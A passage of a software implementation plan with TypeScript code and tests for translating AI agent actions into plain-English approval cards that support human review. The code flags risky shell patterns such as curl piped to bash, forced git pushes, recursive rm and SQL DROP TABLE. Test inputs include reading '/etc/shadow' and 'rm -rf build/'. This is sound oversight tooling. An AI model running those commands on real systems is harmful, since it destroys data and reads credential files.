function noun(value: string): string {
  const flat = value.replace(/\s+/g, ' ').trim();
  return flat.length > MAX_OPERAND ? `${flat.slice(0, MAX_OPERAND)}…` : flat;
}

function firstOperand(stage: ShellStage, fallback: string): string {
  return stage.operands.length > 0 ? noun(stage.operands[0]) : fallback;
}

function hasFlag(stage: ShellStage, ...names: string[]): boolean {
  return stage.flags.some((f) => names.includes(f) || (f.startsWith('-') && !f.startsWith('--') && names.some((n) => n.length === 2 && f.includes(n[1]))));
}

/** Returns null when the stage is not recognised. Null is a valid outcome. */
function describeStage(stage: ShellStage): Clause | null {
  const { binary, subcommand } = stage;

  if (binary === 'git' && subcommand === 'push') {
    if (hasFlag(stage, '--force', '--force-with-lease', '-f')) {
      return {
        text: 'Overwrites the shared code history on GitHub',
        warnings: ['Work other people pushed can be lost.'],
        ruleId: 'bash.git.push.force',
      };
    }
    return { text: 'Sends your code changes to GitHub', warnings: [], ruleId: 'bash.git.push' };
  }

  if (binary === 'rm') {
    const target = firstOperand(stage, 'a file');
    const recursive = hasFlag(stage, '-r', '-R', '--recursive');
    return {
      text: recursive
        ? `Deletes ${target} and everything inside it`
        : `Deletes ${target}`,
      warnings: ['Deleted files do not go to the Recycle Bin.'],
      ruleId: 'bash.rm',
    };
  }

  if (binary === 'curl' || binary === 'wget') {
    const url = firstOperand(stage, 'a website');
    return { text: `Downloads a file from ${url}`, warnings: [], ruleId: 'bash.download' };
  }

  if (binary === 'bash' || binary === 'sh' || binary === 'zsh') {
    return { text: 'Runs a script', warnings: [], ruleId: 'bash.interpreter' };
  }

  if ((binary === 'npm' || binary === 'pnpm' || binary === 'yarn') && (subcommand === 'install' || subcommand === 'i' || subcommand === 'add')) {
    const pkg = stage.operands.length > 0 ? noun(stage.operands[0]) : null;
    return {
      text: pkg
        ? `Adds a third-party package, ${pkg}, to your project`
        : 'Installs the project’s third-party packages',
      warnings: [],
      ruleId: 'bash.package.install',
    };
  }

  if (binary === 'psql' || binary === 'mysql') {
    const sql = stage.operands.join(' ').toUpperCase();
    if (sql.includes('DROP TABLE')) {
      return { text: 'Permanently deletes a table from your database', warnings: ['This cannot be undone.'], ruleId: 'bash.sql.drop' };
    }
    if (sql.includes('DELETE FROM')) {
      return { text: 'Deletes rows from your database', warnings: ['This cannot be undone.'], ruleId: 'bash.sql.delete' };
    }
    return { text: 'Runs a command against your database', warnings: [], ruleId: 'bash.sql' };
  }

  if (['ls', 'cat', 'pwd', 'head', 'tail', 'wc', 'which', 'echo', 'find', 'grep'].includes(binary)) {
    return { text: 'Reads information from your computer', warnings: ['Reads only, changes nothing.'], ruleId: 'bash.read' };
  }

  return null;
}

/**
 * curl|bash is materially different from either half: the operator never sees
 * the code that runs. Detected across stages, so it must be checked on the
 * pipeline rather than on any single stage.
 */
function isPipeToShell(stages: ShellStage[]): boolean {
  return stages.some((s, i) => {
    const next = stages[i + 1];
    return (s.binary === 'curl' || s.binary === 'wget') && !!next && ['bash', 'sh', 'zsh'].includes(next.binary);
  });
}

export function describeBash(command: string, bashIntel?: BashIntel): PlainDescription {
  const stages = parseShell(command);
  if (stages.length === 0) return unknownDescription('bash.empty');

  // The classifier is the only source of reversibility. Absent means unknown,
  // never true — a missing signal must not read as reassurance.
  const reversible: boolean | 'unknown' =
    typeof bashIntel?.reversible === 'boolean' ? bashIntel.reversible : 'unknown';

  if (isPipeToShell(stages)) {
    const source = stages[0].operands.length > 0 ? noun(stages[0].operands[0]) : 'a website';
    return {
      headline: `Downloads a script from ${source} and runs it straight away, without showing it to you.`,
      warnings: ['Whoever controls that website chooses what runs.'],
      confidence: 'high',
      reversible,
      ruleId: 'bash.pipe-to-shell',
    };
  }

  const clauses = stages.map(describeStage);
  const known = clauses.filter((c): c is Clause => c !== null);
  if (known.length === 0) return unknownDescription('bash.unrecognised');

  const complete = known.length === stages.length;
  const text = known.map((c) => c.text).join(', then ');
  const warnings = [...new Set(known.flatMap((c) => c.warnings))];

  if (!complete) {
    warnings.unshift('There is more in this command that I can’t read. Check it below before approving.');
  }

  return {
    headline: complete ? `${text}.` : `${text}. There is more here I can’t read.`,
    warnings,
    confidence: complete ? 'high' : 'partial',
    reversible,
    // A mixed pipeline is not calm even if its first stage is; only a
    // single fully-recognised read stays on the calm rule id.
    ruleId: complete && known.length === 1 ? known[0].ruleId : complete ? 'bash.sequence' : 'bash.partial',
  };
}
```

- [ ] **Step 4: Run test to verify it passes**

Run: `npm test -- __tests__/unit/plain-language-bash.test.js`
Expected: PASS, 10 tests.

- [ ] **Step 5: Commit**

```bash
git add app/lib/plain-language/bash.ts __tests__/unit/plain-language-bash.test.js
git commit -m "feat(plain-language): shell rule table with partial-pipeline honesty"
```

---

### Task 6: Dispatcher and the no-calm-lie invariant test

**Files:**
- Create: `app/lib/plain-language/index.ts`
- Test: `__tests__/unit/plain-language-describe-action.test.js`

**Interfaces:**
- Consumes: everything from tasks 1-5.
- Produces: `describeAction(input: DescribeInput): PlainDescription` where

```ts
interface DescribeInput {
  action_type?: string;
  declared_goal?: string | null;
  risk_score?: number | null;
  target?: string | null;
  intel?: { bash?: BashIntel; file?: FileIntel; mcp?: { server?: string } } | null;
}
```

Background: every `declared_goal` the hook writes has the shape `"<Label>: <payload>"` — `Bash: git …` (`:511`), `Write: <path>` (`:558`), `MCP: mcp__server__method` (`:599`), `<Tool>: <json>` (`:634`). The stop hook writes prose with no label (`hooks/dashclaw_stop.py:246`). Split on the **first** `': '` only; the payload may contain more.

- [ ] **Step 1: Write the failing test**

Create `__tests__/unit/plain-language-describe-action.test.js`:

```js
import { describe, it, expect } from 'vitest';
import { describeAction } from '@/lib/plain-language';
import { CALM_RULE_IDS } from '@/lib/plain-language/types';

describe('describeAction dispatch', () => {
  it('routes a Bash goal to the shell translator', () => {
    const out = describeAction({
      declared_goal: 'Bash: git push --force origin main',
      risk_score: 85,
      intel: { bash: { intent: 'destructive', reversible: false } },
    });
    expect(out.headline).toContain('Overwrites');
  });

  it('routes PowerShell down the same path as Bash', () => {
    const out = describeAction({ declared_goal: 'PowerShell: ls', risk_score: 5, intel: { bash: { intent: 'read', reversible: true } } });
    expect(out.ruleId).toBe('bash.read');
  });

  it('routes a file goal to the file translator and prefers target over the parsed path', () => {
    const out = describeAction({ declared_goal: 'Write: app/page.tsx', target: 'app/page.tsx', risk_score: 20, intel: { file: { sensitive_path: false } } });
    expect(out.detail).toBe('app/page.tsx');
  });

  it('routes an MCP goal to the MCP translator', () => {
    const out = describeAction({ declared_goal: 'MCP: mcp__dashclaw-local__dashclaw_guard', risk_score: 5 });
    expect(out.headline).toContain('Asks DashClaw');
  });

  it('routes an unlabelled prose goal to the conversation rule', () => {
    const out = describeAction({ declared_goal: 'Text-only assistant response', risk_score: 0 });
    expect(out.ruleId).toBe('conversation');
  });

  it('returns unknown for a missing goal rather than throwing', () => {
    expect(describeAction({ declared_goal: null }).confidence).toBe('unknown');
  });

  it('caps confidence at partial when the goal hit the 2000-char cap', () => {
    const long = `Bash: ls ${'a'.repeat(2000)}`.slice(0, 2000);
    const out = describeAction({ declared_goal: long, risk_score: 5, intel: { bash: { intent: 'read', reversible: true } } });
    expect(out.confidence).not.toBe('high');
    expect(out.warnings.join(' ')).toContain('too long to record in full');
  });
});

describe('the no-calm-lie invariant', () => {
  const dangerous = [
    { declared_goal: 'Bash: ls -la', risk_score: 90, intel: { bash: { intent: 'read', reversible: true } } },
    { declared_goal: 'MCP: mcp__dashclaw-local__dashclaw_status', risk_score: 85 },
    { declared_goal: 'Read: {"file_path":"/etc/shadow"}', risk_score: 95 },
  ];

  it.each(dangerous)('never returns a calm rule id at high risk: $declared_goal', (input) => {
    const out = describeAction(input);
    expect(CALM_RULE_IDS.has(out.ruleId)).toBe(false);
  });

  it('never claims "nothing is changed" next to a high risk score', () => {
    for (const input of dangerous) {
      const out = describeAction(input);
      expect(`${out.headline} ${out.warnings.join(' ')}`).not.toMatch(/Nothing is changed|Reads only/);
    }
  });
});
```

- [ ] **Step 2: Run test to verify it fails**

Run: `npm test -- __tests__/unit/plain-language-describe-action.test.js`
Expected: FAIL — cannot resolve `@/lib/plain-language`.

- [ ] **Step 3: Implement the dispatcher**

Create `app/lib/plain-language/index.ts`:

```ts
import { describeBash, type BashIntel } from './bash';
import { describeFile, type FileIntel } from './files';
import { describeGenericTool, describeMcp } from './tools';
import { applySafetyFloor, type PlainDescription, unknownDescription } from './types';

export type { PlainDescription, Confidence } from './types';

/** The hook's declared_goal cap (hooks/dashclaw_pretool.py:511). */
const GOAL_CAP = 2000;

const FILE_LABELS = new Set(['Write', 'Edit', 'MultiEdit', 'NotebookEdit']);
const SHELL_LABELS = new Set(['Bash', 'PowerShell']);

export interface DescribeInput {
  action_type?: string | null;
  declared_goal?: string | null;
  risk_score?: number | null;
  target?: string | null;
  intel?: { bash?: BashIntel; file?: FileIntel; mcp?: { server?: string } } | null;
}

function splitGoal(goal: string): { label: string | null; payload: string } {
  const at = goal.indexOf(': ');
  if (at <= 0) return { label: null, payload: goal };
  return { label: goal.slice(0, at), payload: goal.slice(at + 2) };
}

function route(input: DescribeInput): PlainDescription {
  const goal = (input.declared_goal || '').trim();
  if (!goal) return unknownDescription('no-goal');

  const { label, payload } = splitGoal(goal);

  // The stop hook writes prose with no label.
  if (label === null) {
    return {
      headline: goal,
      warnings: [],
      confidence: 'high',
      reversible: true,
      ruleId: 'conversation',
    };
  }

  if (SHELL_LABELS.has(label)) return describeBash(payload, input.intel?.bash);

  if (FILE_LABELS.has(label)) {
    // `target` is the authoritative path (hooks/dashclaw_pretool.py:562);
    // the goal payload is the same value but may have been truncated.
    return describeFile(label, input.target || payload, input.intel?.file);
  }

  if (label === 'MCP') return describeMcp(payload, input.intel?.mcp?.server);

  return describeGenericTool(label, payload);
}

export function describeAction(input: DescribeInput): PlainDescription {
  let desc: PlainDescription;
  try {
    desc = route(input);
  } catch (err) {
    // A crashed sentence generator must never blank the hero surface. Worst
    // case the card degrades to exactly what it renders today.
    console.warn('[plain-language] describeAction failed:', (err as Error)?.message);
    return unknownDescription('translator-error');
  }

  // Silent truncation at the hook's cap means the tail is unknowable.
  const goal = input.declared_goal || '';
  if (goal.length >= GOAL_CAP && desc.confidence === 'high') {
    desc = {
      ...desc,
      confidence: 'partial',
      warnings: [...desc.warnings, 'This command was too long to record in full, so I can only read the start of it.'],
    };
  }

  return applySafetyFloor(desc, input.risk_score ?? 0);
}
```

- [ ] **Step 4: Run test to verify it passes**

Run: `npm test -- __tests__/unit/plain-language-describe-action.test.js`
Expected: PASS, 9 tests.

- [ ] **Step 5: Run the whole module's tests together**

Run: `npm test -- __tests__/unit/plain-language-`
Expected: PASS, 46 tests across 6 files.

- [ ] **Step 6: Commit**

```bash
git add app/lib/plain-language/index.ts __tests__/unit/plain-language-describe-action.test.js
git commit -m "feat(plain-language): describeAction dispatcher and no-calm-lie invariant tests"
```

---

### Task 7: Batched guard-context read

`listActions` has no guard-decision join — only `getActionWithRelations` joins one, by the `guard_decision_id` FK (`actions.repository.ts:1199`). Rather than widen the shared list query used by many callers, fetch the contexts for one page of rows in a single batched query.

**Files:**
- Modify: `app/lib/repositories/actions.repository.ts`
- Test: `__tests__/unit/plain-language-guard-contexts.repository.test.js`

**Interfaces:**
- Consumes: the existing `parseJsonColumn` helper at `actions.repository.ts:1166`.
- Produces: `getGuardContextsByIds(sql: SqlClient, orgId: string, ids: string[]): Promise<Map<string, Record<string, unknown>>>` — maps `guard_decision_id` to its parsed `context`.

- [ ] **Step 1: Write the failing test**

Create `__tests__/unit/plain-language-guard-contexts.repository.test.js`:

```js
import { describe, it, expect, vi } from 'vitest';
import { getGuardContextsByIds } from '@/lib/repositories/actions.repository';

function sqlMock(rows) {
  return vi.fn(async () => rows);
}

describe('getGuardContextsByIds', () => {
  it('returns an empty map without querying when given no ids', async () => {
    const sql = sqlMock([]);
    const out = await getGuardContextsByIds(sql, 'org_1', []);
    expect(out.size).toBe(0);
    expect(sql).not.toHaveBeenCalled();
  });

  it('parses the TEXT context column into objects keyed by decision id', async () => {
    const sql = sqlMock([
      { id: 'gd_1', context: JSON.stringify({ intel: { bash: { intent: 'destructive' } } }) },
      { id: 'gd_2', context: JSON.stringify({ intel: { file: { sensitive_path: true } } }) },
    ]);
    const out = await getGuardContextsByIds(sql, 'org_1', ['gd_1', 'gd_2']);
    expect(out.get('gd_1').intel.bash.intent).toBe('destructive');
    expect(out.get('gd_2').intel.file.sensitive_path).toBe(true);
  });

  it('skips a row whose context is unparseable rather than throwing', async () => {
    const sql = sqlMock([{ id: 'gd_1', context: '{not json' }]);
    const out = await getGuardContextsByIds(sql, 'org_1', ['gd_1']);
    expect(out.has('gd_1')).toBe(false);
  });

  it('de-duplicates ids before querying', async () => {
    const sql = sqlMock([]);
    await getGuardContextsByIds(sql, 'org_1', ['gd_1', 'gd_1', 'gd_2']);
    expect(sql.mock.calls[0].at(-1)).toEqual(['gd_1', 'gd_2']);
  });
});
```

- [ ] **Step 2: Run test to verify it fails**

Run: `npm test -- __tests__/unit/plain-language-guard-contexts.repository.test.js`
Expected: FAIL — `getGuardContextsByIds is not a function`.

- [ ] **Step 3: Add the repository function**

Append to `app/lib/repositories/actions.repository.ts`, immediately after `getActionWithRelations` (which ends at line 1229):

```ts
/**
 * Batched read of guard-decision contexts for one page of action rows.
 *
 * The plain-language translator needs `context.intel` for every pending
 * approval, but `listActions` deliberately does not join guard_decisions —
 * widening that shared query would cost every other caller. One extra
 * indexed lookup per page is cheaper and touches nothing else.
 *
 * Returns a map of guard_decision_id -> parsed context. Rows whose context
 * will not parse are omitted; the caller degrades to an untranslated card.
 */
export async function getGuardContextsByIds(
  sql: SqlClient,
  orgId: string,
  ids: string[],
): Promise<Map<string, Record<string, unknown>>> {
  const unique = [...new Set(ids.filter(Boolean))];
  const out = new Map<string, Record<string, unknown>>();
  if (unique.length === 0) return out;

  const rows = await sql`
    SELECT id, context
    FROM guard_decisions
    WHERE org_id = ${orgId} AND id = ANY(${unique})
  `;

  for (const row of rows) {
    const parsed = parseJsonColumn(row.context);
    if (parsed && typeof parsed === 'object') {
      out.set(String(row.id), parsed as Record<string, unknown>);
    }
  }
  return out;
}
```

- [ ] **Step 4: Run test to verify it passes**

Run: `npm test -- __tests__/unit/plain-language-guard-contexts.repository.test.js`
Expected: PASS, 4 tests.

- [ ] **Step 5: Verify the SQL gate still passes**

Run: `npm run route-sql:check && npm run typecheck`
Expected: PASS. The SQL lives in a repository, which is exempt.

- [ ] **Step 6: Commit**

```bash
git add app/lib/repositories/actions.repository.ts __tests__/unit/plain-language-guard-contexts.repository.test.js
git commit -m "feat(actions): batched guard-decision context read for plain-language translation"
```

---

### Task 8: Attach `plain` on the pending-approvals response

**Files:**
- Modify: `app/api/actions/route.ts` (the `GET` handler, after the `listActions` call at line 123)
- Test: `__tests__/unit/plain-language-actions-route.test.js`

**Interfaces:**
- Consumes: `describeAction` from `@/lib/plain-language`, `getGuardContextsByIds` from the actions repository.
- Produces: each action object in the `status=pending_approval` response gains a `plain: PlainDescription` property.

Scope rule: enrich **only** when `status === 'pending_approval'`. Every other list caller keeps today's payload and today's query count.

- [ ] **Step 1: Write the failing test**

Create `__tests__/unit/plain-language-actions-route.test.js`. Follow the mocking style of `__tests__/unit/guard-intel.test.js` — `vi.hoisted` for the mocks, `vi.mock` before the import under test:

```js
import { describe, it, expect, vi, beforeEach } from 'vitest';

const { mockListActions, mockGetContexts, mockSweep, mockMaybeSweep } = vi.hoisted(() => ({
  mockListActions: vi.fn(),
  mockGetContexts: vi.fn(async () => new Map()),
  mockSweep: vi.fn(async () => []),
  mockMaybeSweep: vi.fn(async () => []),
}));

vi.mock('@/lib/repositories/actions.repository', () => ({
  listActions: mockListActions,
  getGuardContextsByIds: mockGetContexts,
  sweepExpiredApprovals: mockSweep,
  maybeSweepLostOutcomes: mockMaybeSweep,
}));

import { enrichWithPlainLanguage } from '@/api/actions/route';

describe('enrichWithPlainLanguage', () => {
  beforeEach(() => vi.clearAllMocks());

  it('attaches a plain description built from the joined guard context', async () => {
    const rows = [{ action_id: 'a1', guard_decision_id: 'gd_1', declared_goal: 'Bash: rm -rf build/', risk_score: 85 }];
    mockGetContexts.mockResolvedValueOnce(new Map([['gd_1', { intel: { bash: { intent: 'destructive', reversible: false } } }]]));

    const out = await enrichWithPlainLanguage({}, 'org_1', rows);
    expect(out[0].plain.headline).toContain('build/');
    expect(out[0].plain.reversible).toBe(false);
  });

  it('still attaches a description when the row has no guard decision', async () => {
    const rows = [{ action_id: 'a1', guard_decision_id: null, declared_goal: 'Write: app/page.tsx', target: 'app/page.tsx', risk_score: 10 }];
    const out = await enrichWithPlainLanguage({}, 'org_1', rows);
    expect(out[0].plain.confidence).toBe('high');
    expect(mockGetContexts).toHaveBeenCalledWith({}, 'org_1', []);
  });

  it('degrades to an untranslated card when the context read fails', async () => {
    mockGetContexts.mockRejectedValueOnce(new Error('db down'));
    const rows = [{ action_id: 'a1', guard_decision_id: 'gd_1', declared_goal: 'Bash: rm -rf build/', risk_score: 85 }];
    const out = await enrichWithPlainLanguage({}, 'org_1', rows);
    expect(out[0].plain).toBeDefined();
    expect(out[0].action_id).toBe('a1');
  });

  it('makes exactly one context query for a whole page', async () => {
    const rows = Array.from({ length: 25 }, (_, i) => ({ action_id: `a${i}`, guard_decision_id: `gd_${i}`, declared_goal: 'Bash: ls', risk_score: 5 }));
    await enrichWithPlainLanguage({}, 'org_1', rows);
    expect(mockGetContexts).toHaveBeenCalledTimes(1);
  });
});
```

- [ ] **Step 2: Run test to verify it fails**

Run: `npm test -- __tests__/unit/plain-language-actions-route.test.js`
Expected: FAIL — `enrichWithPlainLanguage` is not exported.

- [ ] **Step 3: Add the exported helper to the route**

In `app/api/actions/route.ts`, add to the imports:

```ts
import { describeAction } from '@/lib/plain-language';
import { getGuardContextsByIds } from '@/lib/repositories/actions.repository';
```

Add above the `GET` handler:

```ts
/**
 * Attach a plain-English description to each pending-approval row.
 *
 * Exported for unit tests. Read-time only: this never runs on the guard hot
 * path, and improving a phrase re-reads all existing history correctly with
 * no backfill.
 *
 * Best-effort by design — a failed context read degrades each card to its
 * untranslated form rather than failing the hero surface.
 */
export async function enrichWithPlainLanguage(
  sql: unknown,
  orgId: string,
  rows: Array<Record<string, unknown>>,
): Promise<Array<Record<string, unknown>>> {
  const ids = rows
    .map((r) => r.guard_decision_id)
    .filter((id): id is string => typeof id === 'string' && id.length > 0);

  const contexts = await getGuardContextsByIds(sql as never, orgId, ids).catch((err: unknown) => {
    console.warn('[ACTIONS GET] guard context read for plain language failed:', (err as Error)?.message);
    return new Map<string, Record<string, unknown>>();
  });

  return rows.map((row) => {
    const gdId = typeof row.guard_decision_id === 'string' ? row.guard_decision_id : null;
    const context = gdId ? contexts.get(gdId) : undefined;
    return {
      ...row,
      plain: describeAction({
        action_type: row.action_type as string | null,
        declared_goal: row.declared_goal as string | null,
        risk_score: row.risk_score as number | null,
        target: (row.target as string | null) ?? (context?.target as string | null) ?? null,
        intel: (context?.intel as never) ?? null,
      }),
    };
  });
}
```

- [ ] **Step 4: Wire it into the GET handler**

After the `listActions` call (line 123 onward), enrich only the pending path. Locate where `result` is returned and insert before it:

```ts
    if (status === 'pending_approval' && Array.isArray(result.actions)) {
      result.actions = await enrichWithPlainLanguage(sql, orgId, result.actions);
    }
```

Adjust the property name to match whatever `listActions` actually returns — read its return type before editing rather than assuming `result.actions`.

- [ ] **Step 5: Run test to verify it passes**

Run: `npm test -- __tests__/unit/plain-language-actions-route.test.js`
Expected: PASS, 4 tests.

- [ ] **Step 6: Verify gates**

Run: `npm run lint && npm run typecheck && npm run route-sql:check`
Expected: PASS on all three.

- [ ] **Step 7: Commit**

```bash
git add app/api/actions/route.ts __tests__/unit/plain-language-actions-route.test.js
git commit -m "feat(actions): attach plain-language descriptions to pending approvals"
```

---

### Task 9: Render the approvals card

Read `.impeccable.md` before starting. No hardcoded hex — use the tokens already in use on this card (`text-white`, `text-secondary`, `text-tertiary`, `border-border`, `bg-surface-tertiary`, `text-error`, `text-warning`).

**Files:**
- Modify: `app/approvals/page.tsx:449-455`

**Interfaces:**
- Consumes: `action.plain` from Task 8.
- Produces: no new exports.

The layout, settled against mockups during brainstorming:

1. Irreversibility band above the headline, rendered **only** when `plain.reversible === false`.
2. `plain.headline` as the `h3`, replacing today's `declared_goal` headline.
3. `plain.warnings` beneath the headline.
4. The exact command always visible below, under an "Exact command" label — never collapsed, never replaced.
5. When `plain.confidence === 'unknown'`, the headline renders muted with a neutral "Not translated" badge, not a warning-coloured one. The action is not necessarily dangerous; we simply cannot vouch for a summary.

- [ ] **Step 1: Replace the headline block**

Replace lines 449-455 (the `declared_goal.length > 160` ternary) with:

```tsx
                            {action.plain?.reversible === false && (
                              <div className="mb-3 flex items-start gap-2 rounded-r-lg border-l-2 border-error bg-error/10 px-3 py-2 text-sm text-error">
                                <AlertTriangle size={14} className="mt-0.5 shrink-0" />
                                <span><strong className="font-semibold">This cannot be undone.</strong></span>
                              </div>
                            )}
                            <h3
                              className={`break-words text-lg font-semibold ${
                                action.plain?.confidence === 'unknown' ? 'text-tertiary' : 'text-white'
                              }`}
                            >
                              {action.plain?.headline || action.declared_goal}
                            </h3>
                            {action.plain?.detail && action.plain.confidence === 'unknown' && (
                              <p className="mt-1.5 text-sm text-tertiary">{action.plain.detail}</p>
                            )}
                            {(action.plain?.warnings || []).map((w: string) => (
                              <p key={w} className="mt-1.5 flex items-start gap-2 text-sm text-warning">
                                <AlertTriangle size={14} className="mt-0.5 shrink-0" />
                                <span>{w}</span>
                              </p>
                            ))}
                            {/* The literal command is never hidden or replaced. An
                                operator who does not trust the sentence can always
                                drop to the exact text, with no click. */}
                            <div className="mt-3">
                              <div className="mb-1 text-[11px] font-semibold uppercase tracking-[0.14em] text-tertiary">
                                Exact command
                              </div>
                              <pre className="max-h-48 overflow-y-auto whitespace-pre-wrap break-all rounded-lg border border-border bg-surface-tertiary px-3 py-2 font-mono text-xs leading-relaxed text-secondary">
                                {action.declared_goal}
                              </pre>
                            </div>
```

- [ ] **Step 2: Add the "Not translated" badge**

In the badge row (line 431-437), after the `Act-bound` badge:

```tsx
                              {action.plain?.confidence === 'unknown' && (
                                <Badge variant="default" size="xs">Not translated</Badge>
                              )}
```

- [ ] **Step 3: Ensure `AlertTriangle` is imported**

Check the `lucide-react` import at the top of the file and add `AlertTriangle` if absent.

- [ ] **Step 4: Verify it builds**

Run: `npm run lint && npm run typecheck && npx next build`
Expected: PASS on all three.

- [ ] **Step 5: Commit**

```bash
git add app/approvals/page.tsx
git commit -m "feat(approvals): render plain-English headline above the exact command"
```

---

### Task 10: Detail page and notification parity

One sentence on every surface, or the operator learns to distrust whichever one disagrees.

**Files:**
- Modify: `app/decisions/[actionId]/_components/PoliciesTab.tsx`
- Modify: `app/lib/notification-adapters/index.ts`
- Test: `__tests__/unit/plain-language-notification-parity.test.js`

**Interfaces:**
- Consumes: `describeAction` from `@/lib/plain-language`.
- Produces: no new exports.

The detail page already reads `guardDecision.context?.intel?.bash?.validations` at line 55, so the context is in hand there — call `describeAction` directly rather than plumbing a new prop.

- [ ] **Step 1: Write the failing test**

Create `__tests__/unit/plain-language-notification-parity.test.js`:

```js
import { describe, it, expect } from 'vitest';
import { describeAction } from '@/lib/plain-language';

/**
 * The notification card and the /approvals card must never disagree. Both
 * read the same function, so this test pins that they are given the same
 * inputs rather than each building their own string.
 */
describe('notification parity', () => {
  it('pins the exact headline both surfaces must render', () => {
    const out = describeAction({
      declared_goal: 'Bash: git push --force origin main',
      risk_score: 85,
      intel: { bash: { intent: 'destructive', reversible: false } },
    });
    // A golden string, not a self-comparison: if either surface ever builds
    // its own sentence instead of calling describeAction, this is the value
    // it has to match.
    expect(out.headline).toBe('Overwrites the shared code history on GitHub.');
    expect(out.warnings).toContain('Work other people pushed can be lost.');
  });

  it('gives a notification something readable even with no intel at all', () => {
    const out = describeAction({ declared_goal: 'Bash: git push --force origin main', risk_score: 85 });
    expect(out.headline).toContain('Overwrites');
    expect(out.reversible).toBe('unknown');
  });
});
```

- [ ] **Step 2: Run test to verify it fails or passes**

Run: `npm test -- __tests__/unit/plain-language-notification-parity.test.js`
Expected: PASS immediately — this test pins existing behaviour from Task 6. If it fails, Task 6 is wrong; fix that before continuing.

- [ ] **Step 3: Render the description on the detail page**

In `PoliciesTab.tsx`, above the existing validations block (line 51), add:

```tsx
        {(() => {
          const plain = describeAction({
            declared_goal: action.declared_goal,
            risk_score: action.risk_score,
            target: action.target,
            intel: guardDecision?.context?.intel,
          });
          if (plain.confidence === 'unknown') return null;
          return (
            <div className="mb-4 rounded-lg border border-border bg-surface-tertiary p-3">
              <div className="mb-1 text-[11px] font-semibold uppercase tracking-[0.14em] text-tertiary">
                In plain English
              </div>
              <p className="text-sm text-white">{plain.headline}</p>
              {plain.warnings.map((w) => (
                <p key={w} className="mt-1 text-sm text-warning">{w}</p>
              ))}
            </div>
          );
        })()}
```

Add the import: `import { describeAction } from '@/lib/plain-language';`

- [ ] **Step 4: Use the headline in notification cards**

In `app/lib/notification-adapters/index.ts`, find where the approval notification body is composed from `declared_goal`. Replace the `declared_goal` line with the plain headline, keeping the raw command as a following line:

```ts
  const plain = describeAction({
    declared_goal: action.declared_goal,
    risk_score: action.risk_score,
    target: action.target,
    intel: context?.intel,
  });
  // Headline first, exact command second — same order as the /approvals card,
  // so a Telegram approval and a web approval read identically.
  const body = `${plain.headline}\n\n${action.declared_goal}`;
```

Read the surrounding code first; match the existing template shape rather than pasting this verbatim.

- [ ] **Step 5: Verify gates**

Run: `npm run lint && npm run typecheck && npx next build`
Expected: PASS on all three.

- [ ] **Step 6: Commit**

```bash
git add app/decisions app/lib/notification-adapters __tests__/unit/plain-language-notification-parity.test.js
git commit -m "feat(plain-language): same sentence on the detail page and notification cards"
```

---

### Task 11: Rendered proof and full gates

Unit tests prove the data exists. Only a rendered page proves a human can use it. This is the HUMAN-EXPERIENCE clause 4 gate and the task is not done without it.

**Files:** none modified unless a defect is found.

- [ ] **Step 1: Run the full test suite**

Run: `npx vitest run --maxWorkers=2`
Expected: PASS, no regressions. Use `--maxWorkers=2`; the full suite OOMs at the default worker count on this machine.

- [ ] **Step 2: Run every gate**

Run: `npm run lint && npm run typecheck && npx next build && npm run route-sql:check && npm run openapi:check && npm run api:inventory:check`
Expected: PASS on all six. Read the output — do not assume green.

- [ ] **Step 3: Drive the rendered page**

Use the `frontend-verify` skill against `/approvals` in demo mode. Confirm by eye:

- a Bash approval shows a sentence, not a shell command, as its headline
- the exact command is visible beneath it without any click
- an irreversible action shows the red band, and a reversible one does not
- an unrecognised action shows the muted "I can't tell you what this one does" card with a neutral "Not translated" badge
- no card shows a calm sentence next to a red risk score

Start the dev server from the **PowerShell tool**, not Bash — `next start` under the Bash tool reports a fake success summary. Kill anything already on port 3000 first.

- [ ] **Step 4: Fix any defect found, then re-verify**

If step 3 surfaces a problem, fix it on the spot and repeat steps 1-3. Do not defer it.

- [ ] **Step 5: Commit and push**

Shared tree — stage explicit paths, never `-A`. If `git status` shows files you did not create, leave them alone and say so.

```bash
git status --short              # .gitattributes drifts silently in this repo
# Stage ONLY the paths this plan created or modified, e.g.:
git add app/lib/plain-language __tests__/unit/plain-language-*.test.js
git commit -m "test(plain-language): rendered verification of the approvals card"
git push
```

If the push is rejected because the other agent pushed first, `git pull --rebase` and re-run the full gate before pushing again — do not force.

- [ ] **Step 6: Read remote CI**

Run: `gh run list --limit 3`
Then read the run. CI env differs from local; assume-green is Vercel-only.

---

## Self-Review

**Spec coverage:**

| Spec section | Task |
|---|---|
| `PlainDescription` contract, confidence semantics | 1 |
| Never-guess rule | 1, 2, 3, 5, 6 |
| Calm-sentence invariant | 1 (`applySafetyFloor`), 6 (invariant tests) |
| Errors fail toward alarm | 1, 5 (`reversible: 'unknown'`), 6 (try/catch, truncation) |
| Two-parser split | 4 (parser names nouns), 5 (classifier owns risk) |
| Bash coverage table | 5 |
| File coverage table | 3 |
| MCP registry + honest unknown | 2 |
| Generic bucket incl. `Read` | 2 |
| Conversation passthrough | 6 |
| Security: bounded, escaped, rendered as data | 2 (`clip`), 3 (`MAX_PATH`), 5 (`noun`) |
| Read-time placement | 7, 8 |
| Card design B + band | 9 |
| Unknown card | 9 |
| Notification + detail parity | 10 |
| Golden files + no-calm-lie test | 6 |
| Rendered proof | 11 |

**Gaps found and closed during review:**

- The spec named `__tests__/unit/plain-language/` as a subdirectory; the repo's convention is flat `__tests__/unit/*.test.js`. Tests use the flat `plain-language-*.test.js` prefix instead.
- The spec's file table listed `Write (new)` and `Write (existing)` as separate headlines. The hook cannot tell which it is, so Task 3 collapses them to "Creates or replaces" rather than shipping a claim we cannot support. The spec table should be corrected to match.
- The spec listed a "registry completeness test" for MCP tools. Not written as a separate task — a test asserting parity with a live MCP tool list would need to import server code into a pure-function test. Task 2's registry is seeded by hand and its coverage is verified by the honest-unknown path, which is safe by construction. **Flagged as an accepted gap**, not silently dropped.

**Type consistency:** `PlainDescription`, `Confidence`, `BashIntel`, `FileIntel`, `ShellStage`, `DescribeInput`, `describeAction`, `describeBash`, `describeFile`, `describeMcp`, `describeGenericTool`, `parseShell`, `applySafetyFloor`, `unknownDescription`, `CALM_RULE_IDS`, `getGuardContextsByIds`, `enrichWithPlainLanguage` — checked; names and signatures match across every task that references them.
